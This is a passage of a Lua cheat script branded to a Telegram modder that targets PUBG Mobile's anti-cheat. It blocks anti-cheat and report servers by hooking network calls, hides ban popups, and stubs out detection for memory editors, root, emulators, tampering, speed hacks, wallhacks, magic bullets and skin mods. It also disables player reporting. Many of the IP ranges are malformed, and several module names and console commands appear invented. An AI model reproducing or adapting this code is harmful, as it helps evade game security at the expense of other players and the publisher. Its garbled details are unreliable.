    "104.4.0.0/8", "104.5.0.0/8", "104.6.0.0/8", "104.7.0.0/8",
    "104.8.0.0/8", "104.9.0.0/8", "104.10.0.0/8", "104.11.0.0/8",
    "104.12.0.0/8", "104.13.0.0/8", "104.14.0.0/8", "104.15.0.0/8",
    "104.16.0.0/8", "104.17.0.0/8", "104.18.0.0/8", "104.19.0.0/8",
    "104.20.0.0/8", "104.21.0.0/8", "104.22.0.0/8", "104.23.0.0/8",
    "104.24.0.0/8", "104.25.0.0/8", "104.26.0.0/8", "104.27.0.0/8",
    "104.28.0.0/8", "104.29.0.0/8", "104.30.0.0/8", "104.31.0.0/8",
    
    -- PUBG Report and Ban Servers TG BY ~ @ASURVIPMOD
    "203.0.0.0/8", "204.0.0.0/8", "205.0.0.0/8", "206.0.0.0/8",
    "207.0.0.0/8", "208.0.0.0/8", "209.0.0.0/8", "210.0.0.0/8",
    "211.0.0.0/8", "212.0.0.0/8", "213.0.0.0/8", "214.0.0.0/8",
    "215.0.0.0/8", "216.0.0.0/8", "217.0.0.0/8", "218.0.0.0/8",
    "219.0.0.0/8", "220.0.0.0/8", "221.0.0.0/8", "222.0.0.0/8",
    "223.0.0.0/8",
    
    -- Other Anti-Cheat Servers TG BY ~ @ASURVIPMOD
    "3.0.0.0/8", "4.0.0.0/8", "5.0.0.0/8", "6.0.0.0/8",
    "7.0.0.0/8", "8.0.0.0/8", "9.0.0.0/8", "10.0.0.0/8",
    "11.0.0.0/8", "12.0.0.0/8", "13.0.0.0/8", "14.0.0.0/8",
    "15.0.0.0/8", "16.0.0.0/8", "17.0.0.0/8", "18.0.0.0/8",
    "19.0.0.0/8", "20.0.0.0/8", "21.0.0.0/8", "22.0.0.0/8",
    "23.0.0.0/8", "24.0.0.0/8", "25.0.0.0/8", "26.0.0.0/8",
    "27.0.0.0/8", "28.0.0.0/8", "29.0.0.0/8", "30.0.0.0/8",
    "31.0.0.0/8", "32.0.0.0/8", "33.0.0.0/8", "34.0.0.0/8",
    "35.0.0.0/8", "36.0.0.0/8", "37.0.0.0/8", "38.0.0.0/8",
    "39.0.0.0/8", "40.0.0.0/8", "41.0.0.0/8", "42.0.0.0/8",
    "44.0.0.0/8", "45.0.0.0/8", "46.0.0.0/8", "47.0.0.0/8",
    "48.0.0.0/8", "49.0.0.0/8", "50.0.0.0/8", "51.0.0.0/8",
    "52.0.0.0/8", "53.0.0.0/8", "54.0.0.0/8", "55.0.0.0/8",
    "56.0.0.0/8", "57.0.0.0/8", "58.0.0.0/8", "59.0.0.0/8",
    "60.0.0.0/8", "61.0.0.0/8", "62.0.0.0/8", "63.0.0.0/8",
    "64.0.0.0/8", "65.0.0.0/8", "66.0.0.0/8", "67.0.0.0/8",
    "68.0.0.0/8", "69.0.0.0/8", "70.0.0.0/8", "71.0.0.0/8",
    "72.0.0.0/8", "73.0.0.0/8", "74.0.0.0/8", "75.0.0.0/8",
    "76.0.0.0/8", "77.0.0.0/8", "78.0.0.0/8", "79.0.0.0/8",
    "80.0.0.0/8", "81.0.0.0/8", "82.0.0.0/8", "83.0.0.0/8",
    "84.0.0.0/8", "85.0.0.0/8", "86.0.0.0/8", "87.0.0.0/8",
    "88.0.0.0/8", "89.0.0.0/8", "90.0.0.0/8", "91.0.0.0/8",
    "92.0.0.0/8", "93.0.0.0/8", "94.0.0.0/8", "95.0.0.0/8",
    "96.0.0.0/8", "97.0.0.0/8", "98.0.0.0/8", "99.0.0.0/8",
    "100.0.0.0/8", "101.0.0.0/8", "102.0.0.0/8", "103.0.0.0/8",
    "105.0.0.0/8", "106.0.0.0/8", "107.0.0.0/8", "108.0.0.0/8",
    "109.0.0.0/8", "110.0.0.0/8", "111.0.0.0/8", "112.0.0.0/8",
    "113.0.0.0/8", "114.0.0.0/8", "115.0.0.0/8", "116.0.0.0/8",
    "117.0.0.0/8", "118.0.0.0/8", "119.0.0.0/8", "120.0.0.0/8",
    "121.0.0.0/8", "122.0.0.0/8", "123.0.0.0/8", "124.0.0.0/8",
    "125.0.0.0/8", "126.0.0.0/8", "127.0.0.0/8",
    
    -- Additional Ban IPs TG BY ~ @ASURVIPMOD
    "10.20.30.40", "10.20.30.41", "10.20.30.42", "10.20.30.43",
    "10.20.30.44", "10.20.30.45", "10.20.30.46", "10.20.30.47",
    "10.20.30.48", "10.20.30.49", "10.20.30.50", "10.20.30.51",
    "10.20.30.52", "10.20.30.53", "10.20.30.54", "10.20.30.55",
}

-- ============================================================
-- Anti-Cheat Domain Blocking List TG BY ~ @ASURVIPMOD
-- ============================================================

_G.BlockedDomains = {
    "pubgm.qq.com", "anticheat.qq.com", "tss.tencent.com",
    "report.qq.com", "ban.qq.com", "security.qq.com",
    "anti.tencent.com", "ac.tencent.com", "safe.qq.com",
    "trust.qq.com", "verify.qq.com", "check.qq.com",
    "monitor.qq.com", "track.qq.com", "analytics.qq.com",
    "telemetry.qq.com", "crash.qq.com", "bugly.qq.com",
    "tlog.qq.com", "log.qq.com", "data.qq.com",
    "api.qq.com", "svc.qq.com", "gw.qq.com",
    "cloud.qq.com", "cdn.qq.com", "static.qq.com",
    "anticheat.tencent.com", "tss.tencent.com", "ace.tencent.com",
    "battleye.com", "easyanticheat.com", "xigncode.com",
    "gameguardian.net", "cheatengine.org", "memoryeditor.com",
    "rootdetect.com", "jailbreak.com", "emulatorcheck.com",
}

-- ============================================================
-- 1. Ban Popup TG BY ~ @ASURVIPMOD
-- ============================================================

local function KillBanPopup()
    pcall(function()
        -- Ban UI TG BY ~ @ASURVIPMOD
        local allWidgets = slua.getUIList() or {}
        for _, widget in pairs(allWidgets) do
            if slua.isValid(widget) then
                local name = widget:GetName() or ""
                if name:find("Legal") or name:find("Common_Legal") or 
                   name:find("Notice") or name:find("Ban") or 
                   name:find("Error") or name:find("Popup") or
                   name:find("Message") or name:find("Dialog") or
                   name:find("Warning") or name:find("Alert") or
                   name:find("Suspension") or name:find("Frozen") or
                   name:find("Penalty") or name:find("Sanction") or
                   name:find("Terminated") or name:find("Blocked") or
                   name:find("Flagged") or name:find("Marked") or
                   name:find("Inspection") or name:find("Risk") then
                    widget:SetWidgetVisibility(UEnums.ESlateVisibility.Collapsed)
                    pcall(function() widget:RemoveFromParent() end)
                end
            end
        end
        
        -- Console command TG BY ~ @ASURVIPMOD
        pcall(function()
            local pc = slua_GameFrontendHUD and slua_GameFrontendHUD:GetPlayerController()
            if slua.isValid(pc) then
                local KSL = import("KismetSystemLibrary")
                if KSL then
                    KSL.ExecuteConsoleCommand(pc, "DisableAllScreenMessages")
                    KSL.ExecuteConsoleCommand(pc, "UI.DisableMessageOfTheDay")
                    KSL.ExecuteConsoleCommand(pc, "ShowMOTD 0")
                    KSL.ExecuteConsoleCommand(pc, "r.UI.DisableAll 1")
                    KSL.ExecuteConsoleCommand(pc, "UI.HideAllWidgets 1")
                    KSL.ExecuteConsoleCommand(pc, "ShowBanNotice 0")
                    KSL.ExecuteConsoleCommand(pc, "ShowSuspension 0")
                    KSL.ExecuteConsoleCommand(pc, "ShowFrozenNotice 0")
                    KSL.ExecuteConsoleCommand(pc, "ShowRiskNotice 0")
                    KSL.ExecuteConsoleCommand(pc, "ShowDeviceError 0")
                    KSL.ExecuteConsoleCommand(pc, "ShowNetworkError 0")
                    KSL.ExecuteConsoleCommand(pc, "DisableBanUI 1")
                    KSL.ExecuteConsoleCommand(pc, "HideBanMessages 1")
                    KSL.ExecuteConsoleCommand(pc, "IgnoreSecurityChecks 1")
                    KSL.ExecuteConsoleCommand(pc, "UIToggle 0")
                    KSL.ExecuteConsoleCommand(pc, "HideUI 1")
                    KSL.ExecuteConsoleCommand(pc, "DisablePopup 1")
                    KSL.ExecuteConsoleCommand(pc, "SuppressDialogs 1")
                end
            end
        end)
    end)
end

-- ============================================================
-- 2. IP/Domain TG BY ~ @ASURVIPMOD
-- ============================================================

local function ApplyIPDomainBlocking()
    pcall(function()
        -- socket.connect TG BY ~ @ASURVIPMOD
        if socket and socket.connect then
            local origConnect = socket.connect
            socket.connect = function(host, port, ...)
                for _, ip in ipairs(_G.BlockedIPs or {}) do
                    if host == ip then return nil, "blocked" end
                end
                for _, domain in ipairs(_G.BlockedDomains or {}) do
                    if host:lower():find(domain) then return nil, "blocked" end
                end
                return origConnect(host, port, ...)
            end
        end
        
        -- socket.tcp TG BY ~ @ASURVIPMOD
        if socket and socket.tcp then
            local origTcp = socket.tcp
            socket.tcp = function(...)
                local client = origTcp(...)
                if client and client.connect then
                    local origConnect = client.connect
                    client.connect = function(self, host, port, ...)
                        for _, ip in ipairs(_G.BlockedIPs or {}) do
                            if host == ip then return nil, "blocked" end
                        end
                        for _, domain in ipairs(_G.BlockedDomains or {}) do
                            if host:lower():find(domain) then return nil, "blocked" end
                        end
                        return origConnect(self, host, port, ...)
                    end
                end
                return client
            end
        end
        
        -- NetUtil.ConnectToServer TG BY ~ @ASURVIPMOD
        if NetUtil and NetUtil.ConnectToServer then
            local origConnect = NetUtil.ConnectToServer
            NetUtil.ConnectToServer = function(ip, port, ...)
                for _, banIP in ipairs(_G.BlockedIPs or {}) do
                    if ip == banIP then return false end
                end
                return origConnect(ip, port, ...)
            end
        end
        
        -- HTTP/WebSocket TG BY ~ @ASURVIPMOD
        if _G.Http and _G.Http.Get then
            local origGet = _G.Http.Get
            _G.Http.Get = function(url, ...)
                for _, domain in ipairs(_G.BlockedDomains or {}) do
                    if url:find(domain) then return nil, "blocked" end
                end
                return origGet(url, ...)
            end
        end
        if _G.Http and _G.Http.Post then
            local origPost = _G.Http.Post
            _G.Http.Post = function(url, ...)
                for _, domain in ipairs(_G.BlockedDomains or {}) do
                    if url:find(domain) then return nil, "blocked" end
                end
                return origPost(url, ...)
            end
        end
        
        -- WebSocket TG BY ~ @ASURVIPMOD
        if _G.WebSocket and _G.WebSocket.Connect then
            local origConnect = _G.WebSocket.Connect
            _G.WebSocket.Connect = function(url, ...)
                for _, domain in ipairs(_G.BlockedDomains or {}) do
                    if url:find(domain) then return nil, "blocked" end
                end
                return origConnect(url, ...)
            end
        end
        
        print("[BYPASS] ✅ IP/Domain TG BY ~ @ASURVIPMOD")
    end)
end

-- ============================================================
-- 3. Game Guardian Detection TG BY ~ @ASURVIPMOD
-- ============================================================

local function BlockGameGuardian()
    pcall(function()
        local GameGuardianDetect = _G.GameGuardianDetect or package.loaded["GameGuardianDetect"]
        if GameGuardianDetect then
            GameGuardianDetect.IsGGRunning = retFalse
            GameGuardianDetect.CheckPackages = retEmpty
            GameGuardianDetect.DetectGameGuardian = retFalse
            GameGuardianDetect.ReportGameGuardian = nop
            GameGuardianDetect.ValidateGG = retTrue
        end
        
        -- Process list  TG BY ~ @ASURVIPMOD
        if _G.ProcessManager and _G.ProcessManager.GetRunningProcesses then
            local origGet = _G.ProcessManager.GetRunningProcesses
            _G.ProcessManager.GetRunningProcesses = function()
                local processes = origGet()
                if processes then
                    local filtered = {}
                    for _, proc in ipairs(processes) do
                        if not string.find(string.lower(tostring(proc)), "gameguardian") then
                            table.insert(filtered, proc)
                        end
                    end
                    return filtered
                end
                return {}
            end
        end
        
        print("[BYPASS] ✅ Game Guardian Detection TG BY ~ @ASURVIPMOD")
    end)
end

-- ============================================================
--  Cheat Engine Detection TG BY ~ @ASURVIPMOD
-- ============================================================

local function BlockCheatEngine()
    pcall(function()
        local CheatEngineDetect = _G.CheatEngineDetect or package.loaded["CheatEngineDetect"]
        if CheatEngineDetect then
            CheatEngineDetect.IsCheatEngineRunning = retFalse
            CheatEngineDetect.CheckProcessList = retEmpty
            CheatEngineDetect.DetectCheatEngine = retFalse
            CheatEngineDetect.ReportCheatEngine = nop
            CheatEngineDetect.ValidateCE = retTrue
        end
        
        if _G.ProcessManager and _G.ProcessManager.GetRunningProcesses then
            local origGet = _G.ProcessManager.GetRunningProcesses
            _G.ProcessManager.GetRunningProcesses = function()
                local processes = origGet()
                if processes then
                    local filtered = {}
                    local ceKeywords = {"cheatengine", "cheat_engine", "ce", "memoryedit"}
                    for _, proc in ipairs(processes) do
                        local procLower = string.lower(tostring(proc))
                        local blocked = false
                        for _, kw in ipairs(ceKeywords) do
                            if procLower:find(kw) then blocked = true break end
                        end
                        if not blocked then table.insert(filtered, proc) end
                    end
                    return filtered
                end
                return {}
            end
        end
        
        print("[BYPASS] ✅ Cheat Engine Detection TG BY ~ @ASURVIPMOD")
    end)
end

-- ============================================================
-- 5. Root/Jailbreak Detection Blocking TG BY ~ @ASURVIPMOD
-- ============================================================

local function BlockRootJailbreak()
    pcall(function()
        local RootDetect = _G.RootDetect or package.loaded["RootDetect"]
        if RootDetect then
            RootDetect.CheckRoot = retFalse
            RootDetect.CheckSu = retFalse
            RootDetect.CheckMagisk = retFalse
            RootDetect.CheckSuperSU = retFalse
            RootDetect.DetectRoot = retFalse
            RootDetect.ReportRoot = nop
            RootDetect.ValidateRoot = retTrue
        end
        
        local JailbreakDetect = _G.JailbreakDetect or package.loaded["JailbreakDetect"]
        if JailbreakDetect then
            JailbreakDetect.CheckJailbreak = retFalse
            JailbreakDetect.CheckCydia = retFalse
            JailbreakDetect.DetectJailbreak = retFalse
            JailbreakDetect.ReportJailbreak = nop
            JailbreakDetect.ValidateJailbreak = retTrue
        end
        
        print("[BYPASS] ✅ Root/Jailbreak Detection TG BY ~ @ASURVIPMOD")
    end)
end

-- ============================================================
-- 6. Emulator Detection Blocking (New) TG BY ~ @ASURVIPMOD
-- ============================================================

local function BlockEmulatorDetection()
    pcall(function()
        -- Emulator Detection ကို TG BY ~ @ASURVIPMOD.
        local EmulatorDetect = import("EmulatorDetect")
        if EmulatorDetect then
            EmulatorDetect.IsEmulator = retFalse
            EmulatorDetect.GetEmulatorType = retEmptyString
            EmulatorDetect.CheckVM = retFalse
            EmulatorDetect.DetectEmulator = retFalse
            EmulatorDetect.ReportEmulator = nop
            EmulatorDetect.ValidateEmulator = retTrue
        end
        
        -- TSS Emulator Check TG BY ~ @ASURVIPMOD.
        if _G.TssSdk then
            _G.TssSdk.IsEmulator = retFalse
            _G.TssSdk.CheckEmulator = retFalse
            _G.TssSdk.ReportEmulator = nop
        end
        
        -- System Properties TG BY ~ @ASURVIPMOD.
        if _G.SystemProperties then
            _G.SystemProperties.ro.kernel.qemu = "0"
            _G.SystemProperties.ro.product.device = "samsung"
            _G.SystemProperties.ro.product.model = "SM-G998B"
            _G.SystemProperties.ro.product.manufacturer = "samsung"
            _G.SystemProperties.ro.hardware = "exynos2100"
        end
        
        print("[BYPASS] ✅ Emulator Detection TG BY ~ @ASURVIPMOD")
    end)
end

-- ============================================================
-- 7. Tamper Detection Blocking (New) TG BY ~ @ASURVIPMOD
-- ============================================================

local function BlockTamperDetection()
    pcall(function()
        -- File Integrity Check  TG BY ~ @ASURVIPMOD.
        local FileIntegrity = import("FileIntegrity")
        if FileIntegrity then
            FileIntegrity.VerifyFile = retTrue
            FileIntegrity.CheckIntegrity = retTrue
            FileIntegrity.ReportTamper = nop
            FileIntegrity.ValidateFile = retTrue
            FileIntegrity.IsFileValid = retTrue
        end
        
        -- Pak File Verification TG BY ~ @ASURVIPMOD.
        local PakVerification = import("PakVerification")
        if PakVerification then
            PakVerification.VerifyPak = retTrue
            PakVerification.CheckPak = retTrue
            PakVerification.ReportPakError = nop
            PakVerification.ValidatePak = retTrue
            PakVerification.IsPakValid = retTrue
        end
        
        -- Memory Tamper Detection TG BY ~ @ASURVIPMOD.
        local MemoryTamper = import("MemoryTamper")
        if MemoryTamper then
            MemoryTamper.DetectTamper = retFalse
            MemoryTamper.ReportTamper = nop
            MemoryTamper.CheckTamper = retFalse
            MemoryTamper.ValidateMemory = retTrue
        end
        
        print("[BYPASS] ✅ Tamper Detection TG BY ~ @ASURVIPMOD")
    end)
end

-- ============================================================
-- 8. SpeedHack Detection Blocking (New) TG BY ~ @ASURVIPMOD
-- ============================================================

local function BlockSpeedHackDetection()
    pcall(function()
        -- Speed Hack Detection TG BY ~ @ASURVIPMOD.
        local SpeedHackDetect = import("SpeedHackDetect")
        if SpeedHackDetect then
            SpeedHackDetect.DetectSpeedHack = retFalse
            SpeedHackDetect.ReportSpeedHack = nop
            SpeedHackDetect.CheckSpeed = retTrue
            SpeedHackDetect.ValidateSpeed = retTrue
            SpeedHackDetect.IsSpeedHack = retFalse
        end
        
        -- Movement Verification TG BY ~ @ASURVIPMOD.
        local MovementVerify = import("MovementVerify")
        if MovementVerify then
            MovementVerify.VerifyMovement = retTrue
            MovementVerify.ReportAbnormalMovement = nop
            MovementVerify.CheckMovement = retTrue
            MovementVerify.ValidateMovement = retTrue
            MovementVerify.IsMovementValid = retTrue
        end
        
        -- Time Scale Check ကို TG BY ~ @ASURVIPMOD.
        local TimeScale = import("TimeScale")
        if TimeScale then
            TimeScale.CheckTimeScale = retTrue
            TimeScale.ReportTimeScale = nop
            TimeScale.ValidateTimeScale = retTrue
            TimeScale.IsTimeScaleValid = retTrue
        end
        
        print("[BYPASS] ✅ SpeedHack Detection TG BY ~ @ASURVIPMOD")
    end)
end

-- ============================================================
-- 9. ESP Detection Blocking (New) TG BY ~ @ASURVIPMOD
-- ============================================================

local function BlockESPDetection()
    pcall(function()
        -- ESP Detection  TG BY ~ @ASURVIPMOD.
        local ESPDetect = import("ESPDetect")
        if ESPDetect then
            ESPDetect.DetectESP = retFalse
            ESPDetect.ReportESP = nop
            ESPDetect.CheckESP = retFalse
            ESPDetect.ValidateESP = retTrue
            ESPDetect.IsESPDetected = retFalse
        end
        
        -- Wallhack Detection  TG BY ~ @ASURVIPMOD.
        local WallhackDetect = import("WallhackDetect")
        if WallhackDetect then
            WallhackDetect.DetectWallhack = retFalse
            WallhackDetect.ReportWallhack = nop
            WallhackDetect.CheckWallhack = retFalse
            WallhackDetect.ValidateWallhack = retTrue
            WallhackDetect.IsWallhackDetected = retFalse
        end
        
        -- Render Check TG BY ~ @ASURVIPMOD.
        local RenderCheck = import("RenderCheck")
        if RenderCheck then
            RenderCheck.CheckRender = retTrue
            RenderCheck.ReportRender = nop
            RenderCheck.ValidateRender = retTrue
            RenderCheck.IsRenderValid = retTrue
        end
        
        print("[BYPASS] ✅ ESP Detection TG BY ~ @ASURVIPMOD")
    end)
end

-- ============================================================
-- 10. NoRecoil Detection Blocking (New) TG BY ~ @ASURVIPMOD
-- ============================================================

local function BlockNoRecoilDetection()
    pcall(function()
        -- NoRecoil Detection TG BY ~ @ASURVIPMOD.
        local NoRecoilDetect = import("NoRecoilDetect")
        if NoRecoilDetect then
            NoRecoilDetect.DetectNoRecoil = retFalse
            NoRecoilDetect.ReportNoRecoil = nop
            NoRecoilDetect.CheckRecoil = retTrue
            NoRecoilDetect.ValidateRecoil = retTrue
            NoRecoilDetect.IsNoRecoil = retFalse
        end
        
        -- Shoot Pattern Verification TG BY ~ @ASURVIPMOD.
        local ShootPattern = import("ShootPattern")
        if ShootPattern then
            ShootPattern.VerifyPattern = retTrue
            ShootPattern.ReportPattern = nop
            ShootPattern.CheckPattern = retTrue
            ShootPattern.ValidatePattern = retTrue
            ShootPattern.IsPatternValid = retTrue
        end
        
        print("[BYPASS] ✅ NoRecoil Detection TG BY ~ @ASURVIPMOD")
    end)
end

-- ============================================================
-- 11. Advanced Anti-Cheat Bypass (New) TG BY ~ @ASURVIPMOD
-- ============================================================

local function AdvancedAntiCheatBypass()
    pcall(function()
        -- Unreal Engine Anti-Cheat
        local UAntiCheat = import("UAntiCheat")
        if UAntiCheat then
            UAntiCheat.CheckCheat = retFalse
            UAntiCheat.ReportCheat = nop
            UAntiCheat.ValidateCheat = retTrue
            UAntiCheat.IsCheatDetected = retFalse
            UAntiCheat.DetectCheat = retFalse
            UAntiCheat.KickCheater = nop
            UAntiCheat.BanCheater = nop
        end
        
        -- Blueprint Anti-Cheat
        local BPAntiCheat = import("BPAntiCheat")
        if BPAntiCheat then
            BPAntiCheat.VerifyBlueprint = retTrue
            BPAntiCheat.ReportBlueprint = nop
            BPAntiCheat.CheckBlueprint = retTrue
            BPAntiCheat.ValidateBlueprint = retTrue
            BPAntiCheat.IsBlueprintValid = retTrue
        end
        
        -- Network Anti-Cheat
        local NetAntiCheat = import("NetAntiCheat")
        if NetAntiCheat then
            NetAntiCheat.VerifyNetwork = retTrue
            NetAntiCheat.ReportNetwork = nop
            NetAntiCheat.CheckNetwork = retTrue
            NetAntiCheat.ValidateNetwork = retTrue
            NetAntiCheat.IsNetworkValid = retTrue
        end
        
        print("[BYPASS] ✅ Advanced Anti-Cheat TG BY ~ @ASURVIPMOD")
    end)
end

-- ============================================================
-- 12. Memory Protection Bypass (New) TG BY ~ @ASURVIPMOD
-- ============================================================

local function MemoryProtectionBypass()
    pcall(function()
        -- Memory Scanner ကို TG BY ~ @ASURVIPMOD.
        local MemoryScanner = import("MemoryScanner")
        if MemoryScanner then
            MemoryScanner.ScanMemory = retFalse
            MemoryScanner.ReportMemory = nop
            MemoryScanner.CheckMemory = retTrue
            MemoryScanner.ValidateMemory = retTrue
            MemoryScanner.IsMemoryValid = retTrue
        end
        
        -- Pointer Check ကို TG BY ~ @ASURVIPMOD.
        local PointerCheck = import("PointerCheck")
        if PointerCheck then
            PointerCheck.CheckPointer = retTrue
            PointerCheck.ReportPointer = nop
            PointerCheck.ValidatePointer = retTrue
            PointerCheck.IsPointerValid = retTrue
        end
        
        -- Heap Check ကို TG BY ~ @ASURVIPMOD.
        local HeapCheck = import("HeapCheck")
        if HeapCheck then
            HeapCheck.CheckHeap = retTrue
            HeapCheck.ReportHeap = nop
            HeapCheck.ValidateHeap = retTrue
            HeapCheck.IsHeapValid = retTrue
        end
        
        print("[BYPASS] ✅ Memory Protection TG BY ~ @ASURVIPMOD")
    end)
end

-- ============================================================
-- 13. Player Report Bypass (New) TG BY ~ @ASURVIPMOD
-- ============================================================

local function PlayerReportBypass()
    pcall(function()
        -- Player Report System ကို TG BY ~ @ASURVIPMOD.
        local PlayerReport = import("PlayerReport")
        if PlayerReport then
            PlayerReport.ReportPlayer = nop
            PlayerReport.SendReport = nop
            PlayerReport.CheckReport = retFalse
            PlayerReport.ValidateReport = retTrue
            PlayerReport.IsReportValid = retTrue
        end
        
        -- Report Cooldown TG BY ~ @ASURVIPMOD.
        local ReportCooldown = import("ReportCooldown")
        if ReportCooldown then
            ReportCooldown.GetCooldown = retZero
            ReportCooldown.CheckCooldown = retTrue
            ReportCooldown.ResetCooldown = nop
            ReportCooldown.ValidateCooldown = retTrue
        end
        
        print("[BYPASS] ✅ Player Report TG BY ~ @ASURVIPMOD")
    end)
end

-- ============================================================
-- 14. Magic Bullet Bypass TG BY ~ @ASURVIPMOD
-- ============================================================

local function MagicBulletBypass()
    pcall(function()
        print("[MAGIC BULLET BYPASS] Magic Bullet TG BY ~ @ASURVIPMOD....")
        
        -- Damage Verification TG BY ~ @ASURVIPMOD.
        local DamageVerification = import("DamageVerification")
        if DamageVerification then
            DamageVerification.VerifyDamage = retTrue
            DamageVerification.ReportAbnormalDamage = nop
            DamageVerification.CheckDamage = retTrue
            DamageVerification.ValidateDamage = retTrue
            DamageVerification.IsDamageValid = retTrue
            DamageVerification.ReportInvalidDamage = nop
            DamageVerification.ResetDamageData = nop
            print("[MAGIC BULLET BYPASS] ✅ Damage Verification TG BY ~ @ASURVIPMOD!")
        end
        
        -- Hitbox Verification TG BY ~ @ASURVIPMOD.
        local HitboxVerification = import("HitboxVerification")
        if HitboxVerification then
            HitboxVerification.VerifyHitbox = retTrue
            HitboxVerification.ReportInvalidHit = nop
            HitboxVerification.CheckHitbox = retTrue
            HitboxVerification.ValidateHitbox = retTrue
            HitboxVerification.IsHitboxValid = retTrue
            HitboxVerification.ReportAbnormalHitbox = nop
            HitboxVerification.ResetHitboxData = nop
            print("[MAGIC BULLET BYPASS] ✅ Hitbox Verification TG BY ~ @ASURVIPMOD!")
        end
        
        -- Projectile Verification TG BY ~ @ASURVIPMOD.
        local ProjectileVerification = import("ProjectileVerification")
        if ProjectileVerification then
            ProjectileVerification.VerifyProjectile = retTrue
            ProjectileVerification.ReportAbnormalProjectile = nop
            ProjectileVerification.CheckProjectile = retTrue
            ProjectileVerification.ValidateProjectile = retTrue
            ProjectileVerification.IsProjectileValid = retTrue
            ProjectileVerification.ReportInvalidProjectile = nop
            ProjectileVerification.ResetProjectileData = nop
            print("[MAGIC BULLET BYPASS] ✅ Projectile Verification TG BY ~ @ASURVIPMOD!")
        end
        
        -- Bullet Verification TG BY ~ @ASURVIPMOD.
        local BulletVerification = import("BulletVerification")
        if BulletVerification then
            BulletVerification.VerifyBullet = retTrue
            BulletVerification.ReportAbnormalBullet = nop
            BulletVerification.CheckBullet = retTrue
            BulletVerification.ValidateBullet = retTrue
            BulletVerification.IsBulletValid = retTrue
            BulletVerification.ReportInvalidBullet = nop
            BulletVerification.ResetBulletData = nop
            print("[MAGIC BULLET BYPASS] ✅ Bullet Verification TG BY ~ @ASURVIPMOD!")
        end
        
        -- Shoot Verification TG BY ~ @ASURVIPMOD.
        local ShootVerify = _safe_require("GameLua.Dev.Subsystem.ShootVerifySubSystemClient")
        if ShootVerify then
            ShootVerify.OnShootVerifyFailed = nop
            ShootVerify.SendVerifyData = nop
            ShootVerify.ReportBulletHit = nop
            ShootVerify.UploadHitInfo = nop
            ShootVerify.VerifyShot = retTrue
            ShootVerify.CheckShoot = retTrue
            ShootVerify.ValidateShoot = retTrue
            ShootVerify.IsShootValid = retTrue
            ShootVerify.ReportInvalidShoot = nop
            ShootVerify.ResetShootData = nop
            print("[MAGIC BULLET BYPASS] ✅ Shoot Verification TG BY ~ @ASURVIPMOD!")
        end
        
        print("[MAGIC BULLET BYPASS] ✅ TG BY ~ @ASURVIPMOD. - Magic Bullet detection အားလုံး TG BY ~ @ASURVIPMOD!")
    end)
end

-- ============================================================
-- 15. Skin Mod Bypass TG BY ~ @ASURVIPMOD
-- ============================================================

local function SkinModBypass()
    pcall(function()
        print("[SKIN MOD BYPASS] Skin Mod TG BY ~ @ASURVIPMOD....")
        
        -- Avatar Verification TG BY ~ @ASURVIPMOD.
        local AvatarUtils = import("AvatarUtils")
        if AvatarUtils then
            AvatarUtils.CheckIsWeaponInBlackList = retFalse
            AvatarUtils.IsValidAvatar = retTrue
            AvatarUtils.CheckAvatarIntegrity = retTrue
            AvatarUtils.ReportInvalidAvatar = nop
            AvatarUtils.VerifyAvatar = retTrue
            AvatarUtils.ValidateAvatar = retTrue
            AvatarUtils.IsAvatarValid = retTrue
            AvatarUtils.ResetAvatarData = nop
            print("[SKIN MOD BYPASS] ✅ Avatar Verification TG BY ~ @ASURVIPMOD!")
        end
        
        -- Weapon Verification TG BY ~ @ASURVIPMOD.
        local WeaponVerification = import("WeaponVerification")
        if WeaponVerification then
            WeaponVerification.VerifyWeapon = retTrue
            WeaponVerification.ReportInvalidWeapon = nop
            WeaponVerification.CheckWeapon = retTrue
            WeaponVerification.ValidateWeapon = retTrue
            WeaponVerification.IsWeaponValid = retTrue
            WeaponVerification.ResetWeaponData = nop
            print("[SKIN MOD BYPASS] ✅ Weapon Verification TG BY ~ @ASURVIPMOD!")
        end
        
        -- Vehicle Verification TG BY ~ @ASURVIPMOD.
        local VehicleVerification = import("VehicleVerification")
        if VehicleVerification then
            VehicleVerification.VerifyVehicle = retTrue
            VehicleVerification.ReportInvalidVehicle = nop
            VehicleVerification.CheckVehicle = retTrue
            VehicleVerification.ValidateVehicle = retTrue
            VehicleVerification.IsVehicleValid = retTrue
            VehicleVerification.ResetVehicleData = nop
            print("[SKIN MOD BYPASS] ✅ Vehicle Verification TG BY ~ @ASURVIPMOD!")
        end
        
        print("[SKIN MOD BYPASS] ✅ TG BY ~ @ASURVIPMOD. - Skin Mod detection အားလုံး TG BY ~ @ASURVIPMOD!")
    end)
end

-- ============================================================
-- 16. Version Specific Bypass TG BY ~ @ASURVIPMOD
-- ============================================================

local function VersionSpecificBypasses()
    pcall(function()
        -- GLOBAL Version
        if _G.IS_GLOBAL then
            if _G.TssSdk then
                _G.TssSdk.IsEmulator = retFalse
                _G.TssSdk.ScanMemory = retTrue
                _G.TssSdk.ReportData = nop
                _G.TssSdk.SendReport = nop
                _G.TssSdk.OnRecvData = nop
            end
            local Higgs = package.loaded["GameLua.Mod.BaseMod.Common.Security.HiggsBosonComponent"]
            if Higgs then
                Higgs.bIsEnable = false
                Higgs.bMHActive = false
                Higgs.bCallPreReplication = false
            end
            print("[BYPASS] ✅ Global Version TG BY ~ @ASURVIPMOD.")
        end
        
        -- KR Version
        if _G.IS_KR then
            if _G.TssSdk then
                _G.TssSdk.IsEmulator = retFalse
                _G.TssSdk.ScanMemory = retTrue
                _G.TssSdk.ReportData = nop
                _G.TssSdk.SendReport = nop
                _G.TssSdk.OnRecvData = nop
            end
            local Higgs = package.loaded["GameLua.Mod.BaseMod.Common.Security.HiggsBosonComponent"]
            if Higgs then
                Higgs.bIsEnable = false
                Higgs.bMHActive = false
                Higgs.bCallPreReplication = false
            end
            print("[BYPASS] ✅ KR Version TG BY ~ @ASURVIPMOD.")
        end
        
        -- TW Version
        if _G.IS_TW_VERSION then
            if _G.TssSdk then
                _G.TssSdk.IsEmulator = retFalse
                _G.TssSdk.ScanMemory = retTrue
                _G.TssSdk.ReportData = nop
                _G.TssSdk.SendReport = nop
                _G.TssSdk.OnRecvData = nop
            end
            local Higgs = package.loaded["GameLua.Mod.BaseMod.Common.Security.HiggsBosonComponent"]
            if Higgs then
                Higgs.bIsEnable = false
                Higgs.bMHActive = false
                Higgs.bCallPreReplication = false
            end
            print("[BYPASS] ✅ TW Version TG BY ~ @ASURVIPMOD.")
        end
    end)
end

-- ============================================================
-- 17. TSS SDK Blocking TG BY ~ @ASURVIPMOD
-- ============================================================

local function BlockTssSdk()
    pcall(function()
